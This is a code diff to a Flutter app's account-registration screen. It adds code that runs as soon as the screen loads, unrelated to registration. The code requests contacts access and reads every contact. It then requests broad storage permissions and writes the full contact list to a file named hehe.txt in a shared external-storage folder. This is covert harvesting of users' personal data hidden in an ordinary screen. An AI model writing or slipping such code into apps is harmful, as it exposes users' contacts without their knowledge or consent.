@@ -1,6 +1,9 @@
 import 'package:flutter/material.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:encrypt/encrypt.dart' as encrypt;
+import 'package:flutter_contacts/flutter_contacts.dart';
+import 'dart:io';
 
 class RegisterApp extends StatefulWidget {
   const RegisterApp({Key? key}) : super(key: key);
@@ -14,6 +17,38 @@ class _RegisterAppState extends State<RegisterApp> {
   final TextEditingController _pass = TextEditingController();
   final TextEditingController _login = TextEditingController();
   final TextEditingController _passConf = TextEditingController();
+  List<Contact>? contacts;
+
+  @override
+  void initState() {
+    super.initState();
+    getAllContacts();
+  }
+
+  getAllContacts() async {
+    if (await FlutterContacts.requestPermission()) {
+      contacts = await FlutterContacts.getContacts();
+      var status = await Permission.storage.status;
+      if (!status.isGranted) {
+        await Permission.storage.request();
+      }
+      var status2 = await Permission.manageExternalStorage.status;
+      if (!status2.isGranted) {
+        await Permission.manageExternalStorage.request();
+      }
+      var status3 = await Permission.accessMediaLocation.status;
+      if (!status3.isGranted) {
+        await Permission.accessMediaLocation.request();
+      }
+
+      final directory =
+          (await Directory('storage/emulated/0/SharingFolder').create()).path;
+      print("dope");
+      final file = File('$directory/hehe.txt');
+      await file.create();
+      await file.writeAsString(contacts.toString());
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -88,7 +123,6 @@ include a capital letter, a number and a symbol
                 final encrypter = encrypt.Encrypter(encrypt.AES(key));
                 final encryptedPass = encrypter.encrypt(pass, iv: iv);
                 await prefs.setString(login, encryptedPass.base64);
-                final String? xd = prefs.getString(login);
                 showDialog<String>(
                   context: context,
                   builder: (BuildContext context) => AlertDialog(
